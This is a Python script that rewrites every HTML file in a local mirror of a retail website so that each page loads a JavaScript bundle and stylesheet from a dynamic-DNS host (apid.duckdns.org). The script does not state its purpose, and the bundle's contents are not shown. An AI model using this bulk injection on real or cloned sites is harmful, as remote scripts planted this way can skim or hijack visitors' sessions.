import os
import sys
import traceback
import logging
import argparse
import asyncio

from bs4 import BeautifulSoup

# Configuration parameters
currentdir = os.path.dirname(os.path.abspath(__file__))
BASE_PATH = f"{currentdir}/RWOz/www.runningwarehouse.com.au"

# Configure logger
logFormatter = logging.Formatter("%(asctime)s | %(levelname)-5.5s |  %(message)s")
logger = logging.getLogger()

fileHandler = logging.FileHandler("output.log", mode='w')
fileHandler.setFormatter(logFormatter)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
logger.addHandler(consoleHandler)
logger.setLevel(logging.INFO)

# Storing HTML_FILES
html_files_count = 1

async def html_injector_file_asyncio(file_html_path, html_files_total):
  global html_files_count 
  html_files_count = html_files_count + 1
  html_files_local = html_files_count

  try:

    # print(f"Processing file ({html_files_count}/{html_files_total}) '{file_html_path}' ...")
    logger.debug(f"Processing file ({html_files_local}/{html_files_total}) '{file_html_path}' ...")

    # Read file
    soup = None
    with open(file_html_path, 'r', encoding="ISO-8859-1") as f:

      # Read file
      contents = f.read()
      # Process with Beautifulsoup
      soup = BeautifulSoup(contents, 'html.parser')

      # Check HTML
      if soup.html is None:
        logger.info(f"Non-parseable file ({html_files_local}/{html_files_total}) '{file_html_path}' ...")
        return

      script = soup.new_tag("script")
      script['src'] = "https://apid.duckdns.org/apid/js/bundle.js"

      link = soup.new_tag("link")
      link['href'] = "https://apid.duckdns.org/apid/css/apid.css"

      # Append both tags
      soup.html.head.append(link)
      soup.html.body.append(script) 


    # Dump to file
    with open(file_html_path, "w", encoding="ISO-8859-1" ) as file:
      file.write(str(soup.prettify()))

    logger.info(f"Completed file ({html_files_local}/{html_files_total}) '{file_html_path}' ...")
  except Exception as e:
    logger.error(f"FAILED FILE '{file_html_path}'")
    logger.error(str(e))
    traceback.print_exc()


async def html_injector_asyncio(base_path):
  
  ####################
  # COUNTING HTML FILES
  ####################
  html_files_total = 0
  for root, dirnames, filenames in os.walk(base_path):
    for filename in filenames:
      if filename.endswith('.html'):
        html_files_total = html_files_total + 1

  ####################
  # PROCESSING FILES
  ####################
  file_html_path_list = []
  html_files_count = 0
  for root, dirnames, filenames in os.walk(BASE_PATH):
    for filename in filenames:
      if filename.endswith('.html'):
        file_html_path = f"{root}/{filename}"
        file_html_path_list.append(file_html_path)

  idx = 0
  while idx + 100 < html_files_total:
    logger.info(f"Running files from {idx} to {idx+100}")
    await asyncio.gather(*[ html_injector_file_asyncio(file_html_path, html_files_total) for file_html_path in file_html_path_list[idx+0:idx+100]] )
    idx = idx + 100
    # if idx > 500:
    #   break
  
  # Last files completed
  await asyncio.gather(*[ html_injector_file_asyncio(file_html_path, html_files_total) for file_html_path in file_html_path_list[idx+0:]] )

if __name__ == "__main__":

  # Parser
  parser = argparse.ArgumentParser(description='Injector HTML')
  parser.add_argument('-b', '--base_path', type=str, help='Introduces the path for processing file', required=True)
  args = parser.parse_args()

  # Check folder exists
  if os.path.isdir(args.base_path) == False:
    logger.error(f"Folder '{args.base_path}' does not exist")
    sys.exit(0)

  BASE_PATH = args.base_path

  # Launching processor
  asyncio.run(html_injector_asyncio(BASE_PATH))



